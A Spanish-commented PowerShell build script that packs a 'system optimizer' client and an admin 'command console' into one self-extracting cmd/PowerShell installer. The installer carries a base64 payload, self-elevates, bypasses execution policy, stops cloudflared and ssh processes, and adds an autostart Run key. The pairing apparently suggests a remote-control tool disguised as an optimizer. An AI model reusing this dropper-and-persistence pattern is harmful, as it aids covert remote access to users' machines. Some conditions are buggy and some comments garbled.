<#
.SYNOPSIS
    Compila y empaqueta el Optimizador del Sistema en un único instalador (Setup.cmd).
#>

Write-Host "============================" -ForegroundColor Cyan
Write-Host "Iniciando compilación y empaquetado..." -ForegroundColor Cyan
Write-Host "============================" -ForegroundColor Cyan

$baseDir = $PSScriptRoot
Set-Location $baseDir

# Asegurar que no hay procesos bloqueando archivos (Aggressive Taskkill)
taskkill /F /IM "Optimizador.exe" /T 2>$null
taskkill /F /IM "OptimizadorAdmin.exe" /T 2>$null
taskkill /F /IM "cloudflared.exe" /T 2>$null
taskkill /F /IM "ssh.exe" /T 2>$null
Start-Sleep -Seconds 2

Write-Host "Limpiando compilaciones previas..."
if (Test-Path "bin") { Remove-Item -Recurse -Force "bin" -ErrorAction SilentlyContinue }
if (Test-Path "..\OptimizadorAdmin\bin") { Remove-Item -Recurse -Force "..\OptimizadorAdmin\bin" -ErrorAction SilentlyContinue }

Write-Host "1. Publicando proyectos (Cliente y Servidor)..."
# Compilar como auto-contenido. Para reducir tamaño, podríamos usar PublishSingleFile, pero preferimos 
# asegurar compatibilidad usando PublishDir estandar (.NET 8 runtime ya incluido).

Write-Host "Compilando Optimizador (Cliente)..." -ForegroundColor Magenta
dotnet publish -c Release -r win-x64 --self-contained true
if ($LASTEXITCODE -ne 0) {
    Write-Error "Fallo la compilación del Cliente."
    exit 1
}

Write-Host "Compilando OptimizadorAdmin (Servidor)..." -ForegroundColor Magenta
dotnet publish "..\OptimizadorAdmin\OptimizadorAdmin.csproj" -c Release -r win-x64 --self-contained true
if ($LASTEXITCODE -ne 0) {
    Write-Error "Fallo la compilación del Servidor."
    exit 1
}

$publishDirClient = Join-Path $baseDir "bin\Release\net7.0-windows\win-x64\publish"
$publishDirServer = Join-Path $baseDir "..\OptimizadorAdmin\bin\Release\net7.0-windows\win-x64\publish"

$packDir = Join-Path $baseDir "TempPackDir"
$zipPath = Join-Path $baseDir "OptimizadorSuite_Temp.zip"
$installerPath = Join-Path $baseDir "Instalador_Optimizador_Suite.cmd"

if (Test-Path $packDir) { Remove-Item -Recurse -Force $packDir }
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
if (Test-Path $installerPath) { Remove-Item $installerPath -Force }

New-Item -ItemType Directory -Force -Path $packDir | Out-Null
New-Item -ItemType Directory -Force -Path "$packDir\Client" | Out-Null
New-Item -ItemType Directory -Force -Path "$packDir\Admin" | Out-Null

Write-Host "2. Comprimiendo archivos (Usando .NET ZipFile)..."
Write-Host "  Copiando Cliente..." -ForegroundColor Gray
Copy-Item -Path "$publishDirClient\*" -Destination "$packDir\Client\" -Recurse -Force

# Para distribución, NO empaquetamos pcid.txt ni pcpin.txt.
# De esta forma, la aplicación generará automáticamente un ID único (GUID)
# y un PIN de 6 dígitos único para cada ordenador la primera vez que se ejecute.

Write-Host "  Copiando Admin/Servidor..." -ForegroundColor Gray
Copy-Item -Path "$publishDirServer\*" -Destination "$packDir\Admin\" -Recurse -Force

# Verificar que los directorios tienen contenido
$clientCount = @(Get-ChildItem "$packDir\Client" -Recurse -ErrorAction SilentlyContinue).Count
$adminCount = @(Get-ChildItem "$packDir\Admin" -Recurse -ErrorAction SilentlyContinue).Count
Write-Host "  Cliente: $clientCount archivos"
Write-Host "  Admin: $adminCount archivos"

# Cargar ensamblado de compresiÃ³n
Add-Type -AssemblyName "System.IO.Compression.FileSystem"

# Crear ZIP sin incluir el nombre del directorio base (useBaseDirectory = false)
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($packDir, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
    Write-Host "  ZIP creado exitosamente"
}
catch {
    Write-Error "Error al crear ZIP: $($_.Exception.Message)"
    exit 1
}

if (!(Test-Path $zipPath) -or (Get-Item $zipPath).Length -lt 100) {
    Write-Error "El archivo ZIP no se creÃ³ o estÃ¡ vacÃo."
    exit 1
}

Write-Host "3. Convirtiendo a Base64..."
$bytes = [IO.File]::ReadAllBytes($zipPath)
$base64 = [Convert]::ToBase64String($bytes)

if ([string]::IsNullOrWhiteSpace($base64)) {
    Write-Error "La conversiÃ³n a Base64 fallÃ³ (resultado vacÃo)."
    exit 1
}

Write-Host "4. Generando Instalador Final ($(($base64.Length / 1MB).ToString("F2")) MB de payload)..."

$installerScript = @"
<# :
@echo off
color 0B
echo ========================================
echo   Instalador Optimizador del Sistema
echo ========================================
echo.
NET SESSION >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Este instalador requiere permisos de Administrador.
    echo Pidiendo permisos...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

echo Preparando instalacion...
REM ejecución parcial de la sección PowerShell del propio script.  Leer sólo
REM hasta el marcador <PAYLOAD> para que no se arrastre ningún comentario
REM abierto (p.ej. el «<#» que rodea la carga útil).
powershell -noprofile -executionpolicy bypass -Command "`$p='%~f0'; `$lines=Get-Content `$p; `$payloadMatch=`$lines | Select-String '^[ \t]*<PAYLOAD>[ \t]*$' | Select-Object -First 1; `$idx=if(`$payloadMatch){`$payloadMatch.LineNumber-1}else{`$lines.Count}; `$s=`$lines[0..(`$idx-1)] -join [char]10; `$inputArgs=`$p; Invoke-Expression `$s"
pause
exit /b
#>

`$ErrorActionPreference = "Stop"

Write-Host "Extrayendo archivos de la Suite (Total: $(($base64.Length / 1MB).ToString("F2")) MB)..." -ForegroundColor Yellow
`$scriptPath = `$inputArgs
if (!`$scriptPath) { `$scriptPath = `$MyInvocation.MyCommand.Path }

`$sb = New-Object System.Text.StringBuilder
`$inPayload = `$false

try {
    # Leer el archivo lÃnea por lÃnea para no saturar la memoria con Regex o ReadAllText
    `$reader = [System.IO.File]::OpenText(`$scriptPath)
    while (!`$reader.EndOfStream) {
        `$line = `$reader.ReadLine()
        if (`$line -match '^[ \t]*<PAYLOAD>[ \t]*$') { `$inPayload = `$true; continue }
        if (`$line -match '^[ \t]*</PAYLOAD>[ \t]*$') { `$inPayload = `$false; break }
        
        if (`$inPayload) {
            # Limpieza estricta: solo dejar caracteres Base64 vÃ¡lidos
            `$cleaned = `$line -replace '[^A-Za-z0-9+/=]', ''
            [void]`$sb.Append(`$cleaned)
        }
    }
    `$reader.Close()
} catch {
    Write-Host "Error al leer el instalador: `$($_.Exception.Message)" -ForegroundColor Red
    pause; exit 1
}

`$base64Clean = `$sb.ToString()
if (`$base64Clean.Length -eq 0) {
    Write-Host "Error: No se encontraron datos para extraer." -ForegroundColor Red
    pause; exit 1
}

try {
    # Corregir padding si falta por algÃºn error de truncado
    while (`$base64Clean.Length % 4 -ne 0) { `$base64Clean += "=" }
    
    `$bytes = [Convert]::FromBase64String(`$base64Clean)
    `$tempZip = Join-Path `$env:TEMP "Optimizador_Install.zip"
    [IO.File]::WriteAllBytes(`$tempZip, `$bytes)
} catch {
    Write-Host "Error CrÃtico: Fallo en la decodificaciÃ³n Base64." -ForegroundColor Red
    Write-Host `$_.Exception.Message
    pause; exit 1
}

`$installDir = "`$env:ProgramFiles\Optimizador"
`$oldInstallPath = "`$env:ProgramFiles\TositoOptimizer"

Write-Host "Verificando instalacion previa..." -ForegroundColor Cyan
if (Test-Path `$installDir -or Test-Path `$oldInstallPath) {
    `$choice = Read-Host "¿Deseas desinstalar la versión anterior antes de continuar? (S/N)"
    if (`$choice -eq 'S' -or `$choice -eq 's') {
        Write-Host "Desinstalando versión anterior..." -ForegroundColor Yellow
        taskkill /f /t /im "Optimizador.exe" 2>$null
        taskkill /f /t /im "OptimizadorAdmin.exe" 2>$null
        taskkill /f /t /im "cloudflared.exe" 2>$null
        taskkill /f /t /im "ssh.exe" 2>$null
        Stop-Process -Name "Optimizador" -Force -ErrorAction SilentlyContinue
        Stop-Process -Name "OptimizadorAdmin" -Force -ErrorAction SilentlyContinue
        Stop-Process -Name "cloudflared" -Force -ErrorAction SilentlyContinue
        Stop-Process -Name "ssh" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Test-Path `$installDir) { Remove-Item -Recurse -Force `$installDir -ErrorAction SilentlyContinue }
        if (Test-Path `$oldInstallPath) { Remove-Item -Recurse -Force `$oldInstallPath -ErrorAction SilentlyContinue }
        Write-Host "Desinstalación completada." -ForegroundColor Green
    }
}

Write-Host "Cerrando procesos activos..." -ForegroundColor Yellow
taskkill /f /t /im "Optimizador.exe" 2>$null
taskkill /f /t /im "OptimizadorAdmin.exe" 2>$null
taskkill /f /t /im "cloudflared.exe" 2>$null
taskkill /f /t /im "ssh.exe" 2>$null
Stop-Process -Name "Optimizador" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "OptimizadorAdmin" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cloudflared" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "ssh" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

if (!(Test-Path `$installDir)) {
    New-Item -ItemType Directory -Force -Path `$installDir | Out-Null
}

Write-Host "Descomprimiendo..."
Expand-Archive -Path `$tempZip -DestinationPath `$installDir -Force

# Verificar qué se extrajo
`$extractedDirs = @(Get-ChildItem `$installDir -Directory)
`$extractedExes = @(Get-ChildItem `$installDir -Filter "*.exe" -Recurse)
Write-Host "Directorio extraído: $(@($extractedDirs).Count) carpetas"
Write-Host "Ejecutables encontrados: $(@($extractedExes).Count)" 
`$extractedExes | ForEach-Object { Write-Host "  - `$(`$_.FullName)" }

Remove-Item `$tempZip -Force

Write-Host "Creando accesos directos..."
`$wshShell = New-Object -ComObject WScript.Shell
`$desktopPath = [Environment]::GetFolderPath("Desktop")
`$startMenu = [Environment]::GetFolderPath("CommonPrograms")

# --- Accesos Directos Cliente ---
`$shortcut = `$wshShell.CreateShortcut("`$desktopPath\Optimizador de Sistema V2.lnk")
`$shortcut.TargetPath = "`$installDir\Client\Optimizador.exe"
`$shortcut.WorkingDirectory = "`$installDir\Client"
`$shortcut.IconLocation = "`$installDir\Client\Optimizador.exe"
`$shortcut.Save()

`$shortcutSm = `$wshShell.CreateShortcut("`$startMenu\Optimizador de Sistema V2.lnk")
`$shortcutSm.TargetPath = "`$installDir\Client\Optimizador.exe"
`$shortcutSm.WorkingDirectory = "`$installDir\Client"
`$shortcutSm.IconLocation = "`$installDir\Client\Optimizador.exe"
`$shortcutSm.Save()

# --- Accesos Directos Server ---
`$shortcutAdmin = `$wshShell.CreateShortcut("`$desktopPath\Optimizador Consola de Mando.lnk")
`$shortcutAdmin.TargetPath = "`$installDir\Admin\OptimizadorAdmin.exe"
`$shortcutAdmin.WorkingDirectory = "`$installDir\Admin"
`$shortcutAdmin.IconLocation = "`$installDir\Admin\OptimizadorAdmin.exe"
`$shortcutAdmin.Save()

`$shortcutAdminSm = `$wshShell.CreateShortcut("`$startMenu\Optimizador Consola de Mando.lnk")
`$shortcutAdminSm.TargetPath = "`$installDir\Admin\OptimizadorAdmin.exe"
`$shortcutAdminSm.WorkingDirectory = "`$installDir\Admin"
`$shortcutAdminSm.IconLocation = "`$installDir\Admin\OptimizadorAdmin.exe"
`$shortcutAdminSm.Save()

# --- Auto-inicio ---
`$runKey = "Software\Microsoft\Windows\CurrentVersion\Run"
`$clientExe = "`$installDir\Client\Optimizador.exe"
Set-ItemProperty -Path "HKCU:\`$runKey" -Name "OptimizadorTosito" -Value "`"`$clientExe`""

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Instalacion Completada Exitosamente!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Ya puedes abrir el programa desde tu Escritorio."
exit 0
"@

# Write Top Script
$utf8NoBOM = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText($installerPath, $installerScript, $utf8NoBOM)
# no necesitamos comentar la carga útil; los marcadores <PAYLOAD> son suficientes
[System.IO.File]::AppendAllText($installerPath, "`r`n<PAYLOAD>`r`n", $utf8NoBOM)

# Usar StreamWriter para escribir el Base64 de forma eficiente
$sw = New-Object System.IO.StreamWriter($installerPath, $true, $utf8NoBOM)
try {
    # Dividir en lÃneas de 1000 caracteres para no saturar pero ser eficiente
    for ($i = 0; $i -lt $base64.Length; $i += 1000) {
        $chunk = if ($i + 1000 -le $base64.Length) { $base64.Substring($i, 1000) } else { $base64.Substring($i) }
        $sw.WriteLine($chunk)
    }
}
finally {
    $sw.Close()
}

[System.IO.File]::AppendAllText($installerPath, "</PAYLOAD>`r`n", $utf8NoBOM)

#Remove-Item $zipPath -Force
Remove-Item -Recurse -Force $packDir

Write-Host "`n============================" -ForegroundColor Cyan
Write-Host "¡Instalador Creado Correctamente!" -ForegroundColor Green
Write-Host "Ruta: $installerPath"
Write-Host "============================" -ForegroundColor Cyan
